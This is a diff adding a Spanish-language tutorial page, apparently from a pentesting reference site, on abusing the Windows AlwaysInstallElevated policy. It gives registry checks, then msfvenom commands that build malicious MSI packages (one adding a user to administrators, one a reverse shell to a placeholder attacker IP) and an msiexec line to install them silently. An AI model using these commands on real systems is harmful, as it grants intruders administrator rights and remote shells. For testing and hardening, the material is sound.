@@ -1,0 +1,58 @@
+<h1>Always Install Elevated</h1>
+
+<p>
+    En Windows existe una directiva que indica que los paquetes de Microsoft con extensión .msi siempre se instalarán 
+    con los máximos privilegios. Si esta directiva está habilitada, cualquier atacante podría realizar instalaciones de 
+    forma privilegiada y por lo tanto utilizar un fichero con código malicioso, que le permita realizar un ataque de 
+    elevación de privilegios.
+</p>
+
+
+<h3>◍ Comprobación</h3>
+<p class="mainComment">
+    Para la comprobación solo es necesario saber si el registro para esta directiva se encuentra a 1 con el siguiente comando.
+</p>
+<!-- Code snipet-->
+<div class="snipet_custom position-relative">
+<pre class="code_snipet code_powershell"><code data-language="shell">if((Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -ErrorAction SilentlyContinue).AlwaysInstallElevated -eq 1){echo "ES VULNERABLE!"}
+if((Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -ErrorAction SilentlyContinue).AlwaysInstallElevated -eq 1){echo "ES VULNERABLE!"}  
+</code></pre>
+</div>
+<!-- Code-->
+
+<p class="mainComment">
+    También es posible realizar una comprobación manual con CMD.
+</p>
+<!-- Code snipet-->
+<div class="snipet_custom position-relative">
+<pre class="code_snipet"><code data-language="shell">reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</code></pre>
+</div>
+<!-- Code-->
+
+<h3>◍ Ataque</h3>
+<p class="mainText">
+    Si el registro se encuentra a 1 indicaría que esta directiva está activa y que por lo tanto es vulnerable, de modo que 
+    solamente habría que generar un fichero .msi que contenga código malicioso. La forma más sencilla de realizar algo 
+    así sería utilizar msfvenom de metasploit para añadir tu usuario a administradores o abrir una shell reversa con alta integridad.
+</p>
+<!-- Code snipet-->
+<div class="snipet_custom position-relative">
+<pre class="code_snipet"><code data-language="shell">#Nuevo usuario administrativo
+msfvenom -p windows/exec CMD="net localgroup administrators [usuario] -f msi -o toadmin.msi
+#Shell reversa
+msfvenom -p windows/shell_reverse_tcp LHOST=[IP] LPORT=4444 -f msi -o rev.msi
+</code></pre>
+</div>
+<!-- Code-->
+<p class="mainText">
+    Finalmente se ejecuta el paquete malicioso con el siguiente comando
+</p>
+<!-- Code snipet-->
+<div class="snipet_custom position-relative">
+<pre class="code_snipet"><code data-language="shell">msiexec /quiet /qn /i .\rev.msi
+</code></pre>
+</div>
+<!-- Code-->
